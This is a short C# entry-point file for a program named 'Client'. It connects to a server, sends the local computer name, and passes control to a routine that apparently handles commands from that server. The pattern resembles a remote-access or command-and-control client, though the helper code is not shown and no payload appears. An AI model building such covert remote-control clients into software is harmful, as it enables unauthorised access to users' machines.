using System;
using System.Configuration;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Client
{  
    internal class Program
    {       
        private static void Main(string[] args)
        {
            if (ServerConnector.ConnectWithServer())
            {
                ServerConnector.SendMessage(SystemManagement.GetComputerName());
                SystemManagement.ManageCommands(ServerConnector.Client);
            }
        }
    }
}